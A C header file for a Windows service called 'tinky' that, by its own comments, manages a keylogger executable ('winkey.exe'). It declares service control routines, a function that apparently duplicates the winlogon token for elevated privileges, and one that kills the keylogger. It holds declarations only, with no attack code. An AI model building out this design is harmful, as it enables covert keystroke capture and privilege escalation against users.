#ifndef SVC_H
#define SVC_H

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "advapi32.lib")

// Disables warning about Spectre mitigation
// code insertion for memory loads
#pragma warning(disable: 5045)
// Disables warning about functions marked
// for inlining that are not actually inlined by the compiler
#pragma warning(disable: 4710)

#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <tlhelp32.h>

// Name of the service used for registration and control.
#define SVC_NAME "tinky"

// Name of the keylogger executable that the service will manage.
#define KEYLOGGER_NAME "winkey.exe"

// Event log identifier for reporting service errors.
#define SVC_ERROR 1

// Global variable to hold the status of the service.
extern SERVICE_STATUS          g_svc_status;

// Global variable to hold the service control handler.
extern SERVICE_STATUS_HANDLE   g_svc_status_handle;

// Global event handle used to signal the service to stop.
extern HANDLE                  g_svc_stop_event;

// Global handle for the process managed by the service.
extern HANDLE                  g_process; // Global handle for the process

// service.c
VOID WINAPI svc_main(DWORD argc, LPTSTR* argv);
VOID WINAPI svc_ctrl_handler(DWORD ctrl);
VOID report_svc_status(DWORD current_state, DWORD win32_exit_code, DWORD wait_hint);

// service_manager.c
void install_service(SC_HANDLE scm);
void start_service(SC_HANDLE scm);
void stop_service(SC_HANDLE scm);
void delete_service(SC_HANDLE scm);

// utils.c
HANDLE get_winlogon_duptoken(void);
void kill_winkey_process(void);
void print_error(const char* msg);

#endif // SVC_H
